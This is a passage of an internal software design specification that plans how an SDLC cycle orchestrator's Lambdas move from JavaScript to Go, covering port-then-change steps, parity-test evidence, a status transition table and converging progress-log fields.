**No JS Lambda is created by this spec.** Every new handler is Go. Edits to `agentDrivenOrchestrator/index.js` are minimised to the dispatch seam (Task 2.8) and inherit Wave 5.

#### 0.8.4 ~~One contract, three languages~~ — superseded by §0.9.2

> **⚠ Superseded by §0.9.2. Read that instead.** This subsection argued for language-neutral JSON as the shared source, on the premise that the contract had to bind **three** languages. **Both halves changed:** §0.9.2 settles the source of truth as **Go canonical with one generated JS artifact**, and the Python language turned out not to be a consumer of the contract at all. Retained because the *problem statement* below is still the right frame, and because someone will otherwise re-derive it.

**The problem, restated correctly.** During Phases 3–6 the cycle-effect rules exist in Go (the new consumer) and JS (the legacy orchestrator's `routeAfterEngineering`). **That is two languages, not three.**

The earlier count of three came from the activity-feed selector, and that count was wrong in two ways at once:

| Language | What was assumed | What is actually true |
|---|---|---|
| JS | was to be `backend/common/cycleActivities.js` — `selectActivities`, on reverted commit `51ed3fe0` | **Never shipped.** The file does **not exist on `develop`** — verified. Phase 0 was reverted (§0.8.7), so there is no JS selector in `backend/common/` to reconcile with, and no vite alias to it. The frontend keeps its own selector; no Lambda has one |
| Python | `cc_cycles.py` — `_select_activities`, `PROGRESS_FIELDS`, shipped `e29f8264` | **Reverted, and never needed.** `cc_cycles.py:99` reads `progressLog` directly, which §0.9.7's write-path convergence makes canonical. **No selector, no constants, no branching** — verified across all six Sherpa tool modules |
| Go | did not exist | **Still the only implementation that needs writing**, and with one canonical field there is no selection to do |

**So the hardest instance of the problem dissolved rather than being solved** — §0.8.12 converges the *writers* on `progressLog`, which removes the need for a merge function in any language. What remains is genuinely two-language and is handled by generation (§0.9.2) plus the parity forms in §0.9.6.

**What survives from this subsection.** The shared **test fixtures** are still worth having as data, because they are consumed by Go tests and by the runtime repo's TypeScript tests, and neither generates the other:

| Artifact | Path | Consumed by |
|---|---|---|
| Event/envelope fixtures | **`context/contracts/sdlc/envelopes/*.json`** | Go consumer tests, and the runtime's publisher tests |

The transition table, the status sets, the progress-field contract and the stage map **are not JSON files** — they are Go, with the browser artifact generated from them (§0.9.2). **Do not create `transitions.json`, `statuses.json`, `progress-fields.json` or `stage-map.json`**; an earlier revision specified them and they are superseded.

**Why generation beats authored JSON, since this subsection originally argued the other way:** authored JSON still permits a Go implementation that disagrees with the file, and nothing catches it. Generation makes the Go definition the only editable thing, and the drift check makes staleness a build failure. **That is the same argument this document makes against `saveLearnedPattern`'s declared-versus-enforced split** (§A.5.0a) — a declaration and an implementation as separate artifacts, with no test binding them, has been non-functional in shipped code through two releases.

#### 0.8.5 The rule, precisely: new and updated Lambdas are Go — port first, then change

**Scope, and it is narrower than earlier drafts of this section implied: only Lambdas this work creates or updates must be Go. Lambdas nothing here changes stay exactly as they are.** This is **not** a mandate to migrate the tree, and any wholesale-migration framing elsewhere in this document is superseded by this subsection.

**When a Lambda does need updating, it becomes two steps, both TDD, each its own commit:**

| Step | What | Reviewable as |
|---|---|---|
| **1. Port** | The existing JS, faithfully, to Go. Behaviour-preserving. No feature change, no cleanup, no renames. | **A no-op.** A reviewer should be able to read the diff and conclude nothing observable changed |
| **2. Change** | The actual task, in Go, with a test that fails for the right reason first | the feature |

**"Parity" has to mean something demonstrable, or step 1 is just a rewrite wearing a port's clothes.** Every port task in this document states its parity evidence. Three mechanisms, in descending order of strength:

| Mechanism | When it applies | What it proves |
|---|---|---|
| **A. Ported test suite** | the JS module has behavioural tests | The Go tests are a **case-for-case translation of the existing JS suite** — same inputs, same expected outputs, same test names as sentences. Where a JS test cannot be translated, the port task says which and why. This is the strongest evidence and most SDLC modules qualify: `sdlcEngine.test.js`, `cycleStatusInvariants.test.js`, `runtimeEvents.test.js`, `progressLogger.test.js` |
| **B. Shared fixture agreement** | the contract is expressible as data | Both implementations load the same `context/contracts/sdlc/*.json` and produce identical output (§0.8.4, §0.8.13). Stronger than A for anything table-driven — a transition table, a status set, a stage map |
| **C. Differential run** | behaviour depends on AWS state, so neither A nor B is complete | Run both against the same input and diff the resulting DynamoDB writes. Expensive; reserve it for `routeAfterEngineering`, where the observable behaviour *is* a sequence of writes |

**What does not count as parity evidence:** a source-text regex, a line count, "it compiles", or a Go test written from the spec rather than from the JS. **A port with no parity evidence is a rewrite**, and a rewrite of live orchestration code is the thing this two-step rule exists to prevent.

**TDD is a hard rule for both steps, and one kind of test does not discharge it.**

> **A source-text regex assertion is not a behavioural test.** Phase 0 proved this at cost: an earlier revision of Task 0.5 prescribed `cycle?.progressLog || cycle?.activities` and specified its tests as greps over field *names*. The implementation **failed 7 of 11 behavioural tests** once they were written — every one of which a field-name grep passes. Source greps stay useful as *wiring* guards (§0.2 keeps them for that) but the unit of behaviour must be executed.

**Before specifying any port, check `backend/go/cmd`.** There are **31** Go handlers and many names exist in both trees (`application-provisioner`, and eighteen `devops-*`). **If a Go counterpart exists, the task is extending it, not porting.**

**Checked for this work:** **no Go handler owns the cycle path.** A repo-wide grep of `backend/go` for `CYCLE#` / `development_cycle` returns only `internal/dynamo/generic_test.go` (a fixture) and `internal/discovery/messages.go` (incidental). And **`sdlc-manager` is not the cycle path** — `internal/sdlc` is SDLC *template* CRUD keyed on `sdlcTemplatesPK = "SDLC_TEMPLATES"` / `entityTypeSDLCTemplate = "sdlc_template"` (`handler.go:20-27`), 828 lines including tests. So the cycle path is **new Go code, not an extension** — which is the best case, because new code has no parity obligation at all.

#### 0.8.5a The orchestrator: a partial port is not viable, so do not attempt one

**The hard case, scoped honestly.** `agentDrivenOrchestrator` is 4,984 lines and this work touches it. Under §0.8.5 that means it ports. Three things have to be said plainly.

**First: a partial port of one Lambda is not viable, and not for stylistic reasons.** A Lambda is one deployment artifact with **one runtime and one entrypoint** — `aws_lambda_function.agent_orchestrator` is Node with `handler = index.handler` from `agentDrivenOrchestrator.zip` (`infrastructure/lambdas.tf:1519-1528`). There is no arrangement in which half the handler's functions are Go and half are JS inside that artifact. So "port the cycle path only, leave the rest JS" **is not a partial port of a Lambda — it is either two Lambdas or it is nothing.**

**Second: the viable unit is therefore a new Go Lambda owning the cycle path, and that is what this spec does.** It is not a compromise:

- It is **migration-plan Wave 5's own decomposition strategy** (`internal/orchestrator/cycle.go`, `engineering.go`, `qa.go`, `progress.go`, `pr.go`, …), so it seeds that wave rather than competing with it.
- The consumer is **genuinely new code** — the SQS event transport does not exist today — so it carries **no parity obligation**. Nothing to port, nothing to prove equivalent.
- The legacy JS orchestrator keeps running **untouched** on the legacy path. Zero blast radius on deployed behaviour, which is the opposite of the three-PR extraction an earlier revision specified.

**Third: whether the remaining JS orchestrator counts as "updated" turns on exactly one question, and it is now the pivotal unknown.** Inventory of what this work needs from it:

| Need | Is it an update to the JS Lambda? |
|---|---|
| `mapSessionEvent`, `applyRuntimeEffect` | **No — deletions.** Zero production callers (§0.8.1). Removing dead code is not an update that adds behaviour |
| `routeAfterEngineering`, `writeStatus`, the `addProgressLog` wrapper | **No.** They keep working exactly as they are for the legacy path. The Go consumer gets its own implementations; the JS is not edited |
| `cycleStatuses.js` gaining `ENGINEERING_FAILED` | **No**, under §0.9.2 — the constant is defined in Go and the browser artifact is regenerated; the JS file is not edited |
| **The `buildMode: 'runtime'` dispatch seam (Task 2.8)** | **This is the one.** See OQ-G3 |

So: **if the dispatch seam can be expressed without editing the JS orchestrator, it is not an updated Lambda and does not port.** If it cannot, it does — and that is the whole handler.

**What the whole-handler port costs, in steps rather than time.** Following Wave 5's decomposition, each step being a port+parity commit pair under §0.8.5:

1. `internal/orchestrator/cyclestatus` + `engine` — statuses, sets, predicates, the `TRANSITIONS` table, `applyTransition`, `statusUpdateFragments`, `pollingIndexKey`. **Parity: A + B** (ported `sdlcEngine.test.js` and `cycleStatusInvariants.test.js`, plus `transitions.json`/`statuses.json` agreement). This is Phase 4b's port and it is already specified (§0.8.8)
2. `internal/orchestrator/progress` — `addProgressLog`, `progressTracker`. **Parity: A**
3. `internal/orchestrator/pr` — five `pulls.create` sites, three merge sites, both 422 fallbacks. **Parity: C** — the 422 adoption path is hard-won retry behaviour and a translated unit test will not prove it
4. `internal/orchestrator/cycle` — lifecycle: start, cancel, delete, the conditional writes
5. `internal/orchestrator/planning` — `processPlanGeneration`, the two-step plan write, `approvePlan`
6. `internal/orchestrator/engineering` — dispatch and the completion sequence (`index.js:1839-1943`)
7. `internal/orchestrator/qa` — `routeAfterEngineering`'s QA branch, `invokeQAAgent`. **Parity: C**
8. `internal/orchestrator/build` — the `BUILDING` hop and poller interaction
9. `internal/orchestrator/deploy` — deploy monitoring, retry, the three-attempt cap
10. `internal/orchestrator/comments` — `planComments`
11. `internal/orchestrator/conversation` — the 400 KB offload
12. `internal/orchestrator/router` + `cmd/agent-orchestrator` — HTTP routing and the SQS entrypoint
13. **Cutover** — Terraform swaps runtime, handler and zip; the JS tree is deleted

**Thirteen steps, twenty-six commits, on the single most critical path in the product** — every development cycle flows through it. The migration plan puts it **last, at Wave 5**, explicitly *"defer the orchestrator (most complex, most critical) until patterns are proven"*. **This spec does not schedule it**, and OQ-G3 is what decides whether it becomes a prerequisite. That is why OQ-G3 is the most important unknown the mandate introduces, and why it must be answered before Phase 2 rather than discovered during it.

#### 0.8.6 `backend/common/` is shared with the frontend — the fix is contract data, not a second copy

`backend/common/cycleStatuses.js` is imported by **nine** consumers:

| Consumer class | Count | How |
|---|---|---|
| Lambda modules | 5 | `require('../../common/cycleStatuses')` — `agentDrivenOrchestrator/index.js:55`, `sdlcEngine.js:25`, `sdlcStepGraph.js:19`, `testResultPoller/index.js:21`, `completionPolicy.js:25` |
| Frontend components | 4 | `import cycleStatuses from 'common/cycleStatuses'` — `CycleProgress.jsx:3`, `ActiveCycleHero.jsx:3`, `cycleStatusConfig.js:1`, `ApplicationDetail.jsx:14`, resolved by the vite alias at `vite.config.js:19` |

**There is no Go equivalent.** Porting it for the Lambdas leaves four frontend files importing a file that must not exist.

**Do not solve this with a second copy.** The answer is the mechanism §0.8.4 already establishes, applied one level deeper: **the status constants become language-neutral data.**

> **`context/contracts/sdlc/statuses.json`** — the constant names, their string values, and the set memberships (`ACTIVE_STATUSES`, `ATTENTION_STATUSES`, `UNWATCHED_STATUSES`, terminal, polled).
>
> - **Go** loads or generates from it (a `go:embed` of the JSON is simplest and needs no build step).
> - **The frontend imports the JSON directly** — Vite handles JSON imports natively, so `import statuses from '@contracts/sdlc/statuses.json'` replaces the alias-into-backend hack with something less surprising than what is there now.
> - **The JS `cycleStatuses.js` is deleted** when its last Lambda consumer is ported, not before.

That is a strict improvement over the status quo independent of the mandate: a frontend build currently reaches across into `backend/` and pulls a CommonJS module through a `commonjsOptions.include` shim (`vite.config.js:26-27`). Replacing it with a JSON import removes a genuine oddity.

**The same treatment applies to the activity-feed selector** (§0.8.7 commit 3) and to the transition table (§0.8.8).

#### 0.8.7 Phase 0 is reverted — respec it in Go from scratch

**`feat/sdlc-phase0-cleanups` is back at `origin/develop` (`be8fb4dc`), clean tree, nothing pushed.** The six commits (`caebf0d1`…`29e3283c`) are gone; patches are archived. **There is nothing to adjudicate per commit** — an earlier revision of this subsection did that and it is now moot.

What the reverted work established, and which survives as knowledge rather than as code:

| Finding | Still true |
|---|---|
| `cycle?.progressLog \|\| cycle?.activities` is broken — `progressLog: []` is truthy (`index.js:1096`) | **Yes**, and it is why §0.8.12 solves this at the *write* path instead |
| The prescribed selector **failed 7 of 11 behavioural tests** that a field-name grep would have passed | **Yes** — this is the concrete evidence behind §0.8.5's TDD rule |
| There are three progress writers and three readers, one of them untouchable Python | **Yes** — §0.8.12. But the Python reader turned out to need **no change**: it reads `progressLog` directly, which convergence makes canonical (§0.9.2) |
| `technicalApproach` is read by a dialog reachable only through uncommitted wiring | **Yes** — §0.7, and that wiring is still uncommitted |

**Phase 0 respecified under §0.8.5.** Its tasks sort into three classes:

| Class | Tasks | Shape |
|---|---|---|
| **Exempt — no Lambda involved** | 0.6 (frontend plan dialog), 0.7 (Terraform + cloud-init, **rsyslog**), 0.8 (`auto-approve.ts`, the SDK), 0.9 (runbook), 0.10 (record the mandate in `CLAUDE.md`) | Unchanged from the text below, JS/TS/HCL as appropriate |
| **Permitted deletion** | 0.1 (`codingAgentAdapter.js`, 279 lines, zero callers) | Deleting JS takes JS out of the tree. No port |
| **Deferred to its Go port** | 0.2 (`runtimeDispatch.js`'s three bugs) | **All three bugs are latent** — `createRuntimeSession` is reached only from the `buildMode: 'runtime'` branch, which no application sets, so none has ever fired. **Do not fix them in JS.** They are carried into Phase 2's Go `internal/runtimeclient` as three of its first tests |
| **Superseded** | 0.5 (the activity selector) | **Replaced by §0.8.12's write-path convergence.** Its only surviving piece is the frontend one-liner, which is exempt |

**So Phase 0 under the mandate is: one deletion, one frontend fix, one Terraform change, one SDK fix, two docs — and no Go at all.** That is the correct outcome: Phase 0 was always "free cleanups", and the mandate's effect is to move two of them into the phases that own the Go code rather than to make Phase 0 expensive.

#### 0.8.8 Phase 4b respecified as the first Go port — and it is the right beachhead

**Phase 4b is stopped mid-implementation.** It was adding `ENGINEERING_FAILED` by editing `backend/common/cycleStatuses.js`, `sdlcEngine.js` (the `TRANSITIONS` table) and `sdlcStepGraph.js` — three in-place JS Lambda edits, all now forbidden.

**Respecify it as the port of the cycle state machine to Go.** Part 2 owns the task text; this is the shape it must take, and Part 1 owns it because the contract files are Part 1's.

**Why this is the right first port rather than an unfortunate one:**

- `cycleStatuses.js` (212 lines) is constants plus three predicates. `sdlcEngine.js` (575 lines) is a transition table plus `applyTransition`, `statusUpdateFragments` and `pollingIndexKey`. **Both are pure logic with no AWS calls**, which makes them the cheapest possible thing to write TDD in Go and the easiest to prove equivalent.
- They are already the best-tested modules in the repo — `sdlcEngine.test.js`, `cycleStatusInvariants.test.js`, `cycleStatusesFrontendParity`-style guards. **Those JS suites are the specification the Go tests are written from**, and they encode invariants (no status in both `ACTIVE_STATUSES` and `ATTENTION_STATUSES`; every `ATTENTION_STATUSES` member has an operator affordance) that would otherwise be lost in a port.
- **Everything downstream needs them.** The Go consumer (Phase 3) cannot write a status without `applyTransition`; Wave 5's `internal/orchestrator/*` needs them on day one. Porting them first means the Go side is never blocked waiting for them.

**Where it lands:** `backend/go/internal/orchestrator/cyclestatus/` (constants, sets, predicates) and `backend/go/internal/orchestrator/engine/` (the transition table, `applyTransition`, polling-index derivation). This **seeds the `internal/orchestrator` package that migration-plan Wave 5 prescribes**, rather than competing with it.

**It is two steps, per §0.8.5, and the split is unusually clean here:**

| Step | Content | Parity evidence |
|---|---|---|
| **4b-port** | `cycleStatuses.js` + `sdlcEngine.js` → Go, **with no new status**. Faithful: same 23 statuses, same set memberships, same transition table, same `strict = false` report-and-proceed semantics (`sdlcEngine.js:507`, `:530-544`) including the deliberate unconditional assign | **A + B.** `sdlcEngine.test.js` and `cycleStatusInvariants.test.js` translated case-for-case, **plus** both implementations asserted against `statuses.json` and `transitions.json`. Reviewable as a no-op: no status added, no edge added |
| **4b-change** | Add `ENGINEERING_FAILED` — to the Go constants, the Go `TRANSITIONS` table and `ATTENTION_STATUSES`, then **regenerate the browser artifact** (§0.9.2), plus the frontend's `cycleStatusConfig.js` | A Go test that fails first because the status does not exist, plus the frontend entry |

##### 4b splits into a deliverable Go half and a JS half blocked on the orchestrator port

**An earlier revision of this section assumed 4b could land as one unit. It cannot, and implementation found out the hard way.** Two facts force the split:

1. **`backend/common/cycleStatuses.js` is read-only** under §0.9.2 — the Go definition is canonical and the browser artifact is generated. So `ENGINEERING_FAILED` cannot be added to the JS file.
2. **`sdlcEngine.js` is not "wired to nothing yet".** Its own header comment says so and **the comment is false** — verified: `agentDrivenOrchestrator/index.js:40` is `const { applyTransition, statusUpdateFragments } = require('./sdlcEngine');`, and there are **54 `applyTransition(` call sites** in that file. It is the live transition path for every cycle. **Do not trust that comment; it will mislead the next reader too.**

So:

| Half | Content | Status |
|---|---|---|
| **Go — deliverable now** | `cyclestatus.go` + `transitions.go`: the constants, set memberships, transition table, `applyTransition`, `isLegalTransition`, `explainTransition`, `pollingIndexKey`, `statusUpdateFragments` — **including `ENGINEERING_FAILED`** — plus the generated browser artifact and the drift check | **Ships independently.** Nothing consumes the Go table until Phase 3's worker, so adding a status there is inert and safe |
| **JS — blocked** | Teaching the *live* JS path about `ENGINEERING_FAILED` | **Blocked on the orchestrator port** (§0.9.4). It cannot be done by editing `cycleStatuses.js` or `sdlcEngine.js`, and those are the only two places the JS path learns a status |

**The consequence, and it is the same one §0.8.8 already states in a different form:** until the orchestrator ports, **only Go can write `ENGINEERING_FAILED`.** The JS orchestrator keeps writing `FAILED` on the legacy path, which is correct and unchanged behaviour. Phase 3's per-stage `error` mapping is Go, so it is unaffected — **the 4b gate on Phase 3 is satisfied by the Go half alone.**

**Do not try to unblock the JS half.** Any route to it is an in-place edit of a live Lambda, which §0.8.5 forbids, and the payoff would be a status the legacy path writes for a few weeks before being deleted.

##### Two facts the port must carry across, both found during implementation

**(a) `TERMINAL` is declared twice in JavaScript.** `sdlcEngine.js:240` declares `const TERMINAL = [...]` and `cycleStatuses.js:83` declares `TERMINAL_STATUSES` — **the same fact, twice, in one language**, with `sdlcEngine.js:72`'s comment referring to the other one as though it were the source. `isLegalTransition:255` and `explainTransition:276` both read the local copy.

**The Go port declares it once** and both JS copies are pinned to that single declaration by the drift check (§0.9.2). Record it here because a port that faithfully reproduces "two lists that happen to agree" has reproduced the bug rather than the behaviour.

**(b) `isLegalTransition` and `explainTransition` disagree on 2 of 576 status pairs, and the disagreement is load-bearing.** Verified:

```
isLegalTransition(from, to)          explainTransition(from, to)
  :253  from === to        → true      :268  from === to        → legal
  :255  TERMINAL[from]     → false     :270  !(from in TRANSITIONS) → ILLEGAL "unknown source"   ← rejects here
  :256  UNIVERSAL_TARGETS[to] → TRUE   :276  TERMINAL[from]     → illegal
  :259  TRANSITIONS[from]  → lookup    :279  UNIVERSAL_TARGETS[to] → legal                      ← never reached
```

`isLegalTransition` checks `UNIVERSAL_TARGETS` (`= [CANCELLED, FAILED]`, `:237`) **before** looking up the source, so **an unknown source status legally reaches `CANCELLED` and `FAILED`.** `explainTransition` rejects unknown sources first, so it calls the same two pairs illegal.

**This is not a rounding error, it is the one path where a corrupted `status` would surface.** `applyTransition` reports a violation only when `isLegalTransition` returns false (`:515-541`), and **24 of 54 writes target `FAILED`**. So a cycle whose `status` has been corrupted to something outside the table can be failed with **no violation logged** — the asymmetry hides exactly the case the validator exists to catch.

**The port reproduces it deliberately and pins both functions**, so fixing one language alone fails the parity test. That is correct for a port. **But it needs an owner**, because "reproduce the bug faithfully" is only defensible as a temporary position:

> **Risk R13 — the transition validator's two entry points disagree about unknown source statuses, masking `status` corruption on the `FAILED` path.** Pre-existing, now pinned across two languages. **Owner: unassigned — assign before Phase 3 ships**, because Phase 3's consumer is the first thing to write statuses from Go and will inherit it. The fix is to move `explainTransition`'s unknown-source check after its `UNIVERSAL_TARGETS` check, in **both** languages and the pinned fixtures together, in one commit.

**Doing it in that order is what makes the port reviewable.** A combined commit would mix "is this faithful?" with "is this new edge right?", and the reviewer can answer neither.

**One consequence that must be stated, because it changes who can write the status.** Under the mandate the JS `cycleStatuses.js` cannot gain `ENGINEERING_FAILED` — that would be an in-place Lambda edit. So:

> **The JS orchestrator can never write `ENGINEERING_FAILED`. Only the Go consumer can.** That is consistent with the design — the consumer is what maps a session `error` event to a per-stage failure (Task 3.2) — but it means Part 2's Phase 4b can no longer be described as "add a status the orchestrator writes". The engineering-failure path is Go-only from the start.

**And the frontend still needs the constant**, for `cycleStatusConfig.js`'s entry. It comes from the **generated JS artifact** (§0.9.2), regenerated in the same commit — **one Go edit, one generated file, two consumers.** No Python artifact (§0.9.2's exemption). Formerly this said `context/contracts/sdlc/statuses.json` (§0.8.6), which is where Phase 4b adds it — **one file, three consumers, added once.** The `TRANSITIONS` edge goes in `context/contracts/sdlc/transitions.json` in the same commit (§0.8.4).

#### 0.8.9 Phases 1–2 under the final rule

**Phase 0's other tasks.** Task 0.8 (`auto-approve.ts`) is the SDK — TypeScript, not a Command Center Lambda, **exempt**. Tasks 0.9 (runbook) and 0.10 (record the mandate in `CLAUDE.md`) are documentation, **exempt**.

**Phase 1.** Task 1.1 is an API call; 1.3–1.5 are Terraform; 1.6 is the runtime repo (TypeScript, not a Command Center Lambda) — **all exempt**. **Task 1.2b changes shape:** it was editing `middleware/auth.go` (already Go, fine — TDD in Go) *and* `backend/common/tenantHelpers.js` (JS consumed by Lambdas, now forbidden). So:

> **Task 1.2b becomes Go-only.** Fix `IsMachineToken`/`GetUserID` in `middleware/auth.go` with Go tests first. **Do not edit `tenantHelpers.js`** — instead delete its `isMachineToken`/`hasScope`/`getCallerContext` exports if nothing consumes them (verified: `hasScope` and `getCallerContext` have **zero** callers; `getUserId` has zero JS callers), which is a permitted deletion. The machine-token predicate goes in `context/contracts/sdlc/machine-token.json` so the Go test and any future consumer load one definition.

**Phase 2.** Task 2.1 is the SDK (exempt). Tasks 2.2–2.5 and 2.2b are the runtime repo (exempt). The Command Center side moves wholesale to Go:

| Task | Was | Now |
|---|---|---|
| 2.6 runtime HTTP client | `backend/common/runtimeClient.js` | **`backend/go/internal/runtimeclient/`**, TDD in Go. Uses `internal/awsprov` + `internal/config` per the migration plan's reusable-infrastructure table |
| 2.7 instruction composition | `backend/common/sdlcInstructions.js` | **`backend/go/internal/orchestrator/instructions/`** — **new code, no parity obligation.** But its *inputs* are existing JS Lambda modules (`agentBootstrap.js` 137, `agentMemory.js` 223, `agentSkills.js` 132, `knowledgeBaseLoader.js` 593 = **1,085 lines**) with no Go equivalent, and each would be a port with parity evidence **A** if pulled in. See OQ-G2 |
| 2.8 orchestrator dispatch seam | edit `index.js`'s `buildMode` branch | **an async Lambda invoke into the Go handler.** The JS orchestrator gains no logic; the one line that changes is the branch target, which is still an in-place JS edit — **so even this must wait for the orchestrator's port, or be expressed as Terraform + an env var rather than a code edit.** See OQ-G3 |
| 2.9 smoke script | `scripts/testing/*.js` | a script, not a Lambda — **exempt**, may stay JS |

#### 0.8.10 Phase 3 under the final rule — it gets simpler

Restating what §0.8.1–0.8.3 established, now that the rule is unambiguous:

| Task | Shape |
|---|---|
| 3.1 contract module + fixtures | **`backend/go/internal/orchestrator/contract/`** reading `context/contracts/sdlc/*.json` via `go:embed`. **Not** `backend/common/sdlcContract.js` |
| 3.2 `mapSessionEvent` extensions | **Two steps.** **3.2-port:** `runtimeEvents.js` → `internal/orchestrator/runtimeevents/`, faithful, **parity evidence A** — `runtimeEvents.test.js`'s 122 lines translated case-for-case, including its `only()` helper's single-effect assertions. **3.2-change:** the stage parameterisation, the `completion` arm and the per-stage `error` mapping, each failing first. Then the JS is **deleted** — zero callers (§0.8.1), a permitted deletion |
| **3.3 the `cycleEffects.js` extraction** | **CANCELLED.** §0.8.1. Replaced by `internal/orchestrator/cycleeffects/` — **two steps for `routeAfterEngineering` (port, parity evidence C: a differential run diffing DynamoDB writes across all four `sdlcType` branches, because its observable behaviour *is* a write sequence and a translated unit test will not prove the conditional-persist-on-`ai-qa`-only quirk), and new code for `applyRuntimeEffect`** (zero callers, nothing to be faithful to). **This removes the three-PR, five-call-site, fifty-two-site refactor of a deployed handler that this document called its riskiest change** — the narrowed mandate deletes the riskiest task in Part 1 |
| 3.4 idempotent status write | **Go**, in `internal/orchestrator/engine/` beside `applyTransition` (Phase 4b's port). Uses `internal/dynamo`'s generic Update with a `ConditionExpression` |
| 3.5 the consumer Lambda | **Go**: `backend/go/cmd/sdlc-cycle-worker/`. Exemplar: `internal/provisioner/handler.go:59-71` — `HandleSQSEvent(ctx, events.SQSEvent) (events.SQSEventResponse, error)` returning `BatchItemFailures`, which is the idiomatic Go form of the partial-batch pattern |
| 3.6 Terraform | **Add to `GO_LAMBDA_NAMES` and `GO_LAMBDA_CMDS`** (`scripts/deployment/package-lambdas.sh:420-421`), not `maybe_package`. The Lambda is `provided.al2023`/`arm64` with `handler = "bootstrap"` — copy `aws_lambda_function.devops_diagnosis_api` (`devops-diagnosis.tf:66-85`), **not** the Node exemplar an earlier revision named. No `common_layer`. |
| 3.9 the publisher | Unchanged — it is the runtime repo (TypeScript, exempt). **But `internal/sqs` already supports FIFO**: `SendMessageInput` carries `GroupID` and `DedupeID` (`internal/sqs/client.go:35-66`), so the consumer side needs no new SQS plumbing |

**The net effect of the mandate on Phase 3 is a reduction in risk**, and that is worth stating plainly because it is counter-intuitive: the JS extraction touched five live `routeAfterEngineering` call sites and fifty-two `addProgressLog` sites in a 4,984-line deployed handler with no feature flag. The Go port touches **nothing that is deployed**. The legacy JS path keeps running untouched until Wave 5 retires it.

#### 0.8.12 Converge the progress writers — solve it at the write path, not the read path

**This supersedes Phase 0's Task 0.5 as originally written**, and it is a better fix than the one it replaces.

**The defect restated at its cause.** Two writers put progress entries in two different fields, so every reader has to guess:

| Writer | Field | Sites |
|---|---|---|
| `addProgressLog` (`backend/common/progressLogger.js:43`) | **`progressLog`** | **88** call sites |
| `reportProgress` (`engineeringAgent/orchestratorHandler.js:102`) | `activities` | 33 call sites |
| `progressTracker.js:55` | `activities` | — |
| `integrationAgent/orchestratorHandler.js:65` | `activities` | — (out of SDLC scope) |
| `stuckCycleDetector/index.js:203` | `progressLog` | — |

and three readers disagree:

| Reader | Reads | Status |
|---|---|---|
| `cc_cycles.py:99` | **`progressLog` only** | **UNTOUCHABLE** (§0.8.14 OQ-G1) |
| `CycleProgress.jsx:75` | `activityLog \|\| activities` — and **nothing writes `activityLog`**, so always `activities` | frontend, **exempt** from the mandate |
| `progressTracker.js:190` | `activities \|\| progressLog` | JS Lambda |

**Patching readers was always the weaker fix; with one reader off-limits it is not a fix.** Converge the writers and every reader becomes correct without being modified.

##### `progressLog` wins, and one reason is sufficient on its own

| Reason | Weight |
|---|---|
| **`cc_cycles.py` reads only `progressLog` and cannot be changed** | **Decisive by itself.** Any other choice leaves the untouchable operator-facing reader permanently broken |
| The cycle record already initialises `progressLog: []` (`index.js:1096`) and never initialises `activities` | it is already the declared field |
| 88 call sites vs 33 | converging on the majority writer is a third of the churn |
| The architecture doc already deletes `reportProgress` (§5.2: *"`reportProgress` deletes — it must not move"*) | the `activities` writer is scheduled for removal regardless |
| **`applyRuntimeEffect`'s `activity` arm already calls `addProgressLog`** (`index.js:144`) | **the runtime path is already correct and needs no convergence work at all** |

##### What this means for sequencing — and it is less work than it looks

**The SDLC runtime path requires no convergence.** It writes `progressLog` today. So convergence is **not** a prerequisite of the cutover and does **not** have to be simultaneous with it. That answers the sequencing question directly: the runtime path was never the problem.

What remains is two independent pieces:

1. **The frontend must read `progressLog`.** One line, `CycleProgress.jsx:75` → `cycle?.progressLog || []`. **Frontend code, exempt from the mandate**, and it is the whole of Phase 0's remaining activity-feed work. Without it, moving execution to the runtime replaces a working feed with an empty one — architecture doc **R0**, and still the highest-probability silent failure in the migration. **Drop `activityLog` from the chain**: nothing writes it, and leaving it in tells the next reader that something does.
2. **The three `activities` writers converge to `progressLog` as each Lambda is ported to Go — not as a separate task.** Under the mandate each is a port, and two of the three (`integrationAgent`, `progressTracker`) are outside this project's scope. So this is a **standing rule on those ports**, recorded here so it is not rediscovered:

> **Rule: any Go port of a progress writer writes `progressLog` via the Go equivalent of `addProgressLog`. No Go code writes `cycle.activities`, ever.** The field is legacy-only and read-only from the moment its last JS writer ports.

##### Historical records: no backfill, and the cost stated

Converging writers fixes new cycles and leaves existing ones split. **Recommendation: no backfill.** Reasoning, and the cost is real so it is stated rather than waved through:

- **What is lost:** on a cycle written before convergence, `cc_cycles.py` shows the orchestrator's `progressLog` entries and misses the engineering agent's `activities` entries. The frontend, after fix (1), loses the same entries on those same historical cycles — it currently shows `activities` and will then show `progressLog`. **So fix (1) trades which half of a historical feed is visible.** For a *runtime-path* cycle there is no loss, because all its entries are in `progressLog`.
- **Why not backfill:** merging `activities` into `progressLog` means rewriting every historical cycle item. Cycle records are large and bounded at **400 KB** shared with `expandedRequirements`, `iterations` and the feed itself (§A.4.3), so a merge that duplicates entries into one field can push a big cycle over the limit — turning a cosmetic history gap into a failed write on a record nobody was asking about.
- **The data is not lost**, only unmerged: `activities` remains on the item and is readable ad hoc for any historical investigation.
- **If a backfill is wanted anyway, it is not this project's job.** It is a one-off data migration whose owner is whoever owns the DynamoDB table, it must be idempotent and item-size-aware, and it should run after the last `activities` writer is ported — not before, or it races a live writer.

##### Coordination with Part 2

**Part 2's Phase 7 "collapse the writers" task is superseded as a standalone task.** It becomes:

- the frontend one-liner, which is Phase 0's (piece 1 above), and
- a **constraint on each writer's Go port**, which is the rule above.

There is nothing left for a Phase 7 task to do except confirm no `cycle.activities` writer remains — which is a one-line grep in that phase's exit criteria, not a task. **Tell Part 2 to delete the task and add the grep.**

##### And it dissolves the shared-selector problem entirely

An earlier revision needed a `selectActivities` merge function in JS (frontend) and Go (Lambdas) — and briefly in Python too, before it turned out `cc_cycles.py` reads `progressLog` directly and needs no selector at all (§0.9.2).

**With one canonical field there is nothing to select between, so no shared selector needs to exist in any language.** That removes the hardest instance of the `backend/common/` dual-consumption problem rather than solving it. §0.8.13 handles what remains.

#### 0.8.13 `backend/common/` as a browser-shared JS layer — settle it before Phase 4b

**Pre-existing, larger than anything this spec touches, and it gates Phase 4b's first edit.**

`backend/common/cycleStatuses.js` is consumed from **two runtimes**: five Lambda modules `require` it, and **four frontend files import it** through the `frontend/vite.config.js:19` alias that resolves to the same file, pulled through a `commonjsOptions.include` shim at `:26-27`. A Go port serves the Lambdas and orphans the browser.

Three candidate resolutions, and one is clearly right:

> **⚠ The verdicts in this table are superseded — read §0.9.2 first.** The first row's option is **what the project now does**, and its "over-built" verdict was wrong. It is struck below rather than deleted so the reversal is visible, but **do not read any row of this table as live guidance.**

| Option | Verdict as written (SUPERSEDED) |
|---|---|
